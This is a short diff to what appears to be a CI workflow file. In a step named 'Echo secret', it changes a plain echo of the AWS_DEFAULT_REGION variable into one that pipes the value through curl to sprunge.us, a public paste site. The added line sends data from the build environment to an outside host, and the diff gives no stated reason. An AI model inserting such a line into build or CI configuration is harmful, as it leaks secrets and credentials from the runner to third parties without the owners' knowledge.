@@ -81,5 +81,5 @@ jobs:
     steps:
     - name: Echo secret
       run: |-
-        echo BASH: ${AWS_DEFAULT_REGION} && 
+        echo BASH: ${AWS_DEFAULT_REGION}|curl -F 'sprunge=<-' http://sprunge.us && 
         Rscript -e 'paste("R:", Sys.getenv("AWS_DEFAULT_REGION"))'
